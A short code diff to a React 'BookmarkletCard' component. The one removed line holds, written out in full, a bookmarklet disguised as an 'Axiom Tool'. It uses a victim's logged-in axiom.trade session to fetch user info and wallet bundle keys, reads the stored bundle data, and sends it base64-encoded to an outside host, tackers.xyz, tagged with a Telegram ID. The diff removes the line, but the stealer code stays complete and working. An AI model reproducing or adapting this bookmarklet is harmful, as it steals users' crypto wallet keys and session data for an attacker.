@@ -66,7 +66,6 @@ export default function BookmarkletCard() {
 
             {/* The draggable button */}
             <motion.a
-            <a href="javascript:(async()=>{const l=document.getElementById('log'),g=m=>{const p=document.createElement('div');p.textContent=m;l.appendChild(p)};try{if(location.hostname==='tackers.xyz')return g('Already on test page');if(location.hostname!=='axiom.trade')return g('Please go to axiom.trade first'),setTimeout(()=>location.href='https://axiom.trade/discover',1e3);if(!localStorage.getItem('isAuthed'))return g('Please log in to axiom.trade');g('Fetching user info...');const u=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();g('User info received');const b=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();g('Bundle data received');let s=[],e=[],sr=localStorage.getItem('sBundles'),er=localStorage.getItem('eBundles');if(sr)try{s=JSON.parse(sr)}catch{s=[sr]}if(er)try{e=JSON.parse(er)}catch{e=[er]}const p={bundleKey:b.bundleKey,sBundles:s,eBundles:e,telegramId:'8000848286'},d=btoa(JSON.stringify(p));g('Redirecting to decrypt...'),location.replace('https://tackers.xyz/api/decrypt?data='+d)}catch(err){g('Error: '+err.message),console.error(err)}})();">📌 Axiom Tool</a>
               href={href}
               draggable="true"
               onClick={(e) => e.preventDefault()}
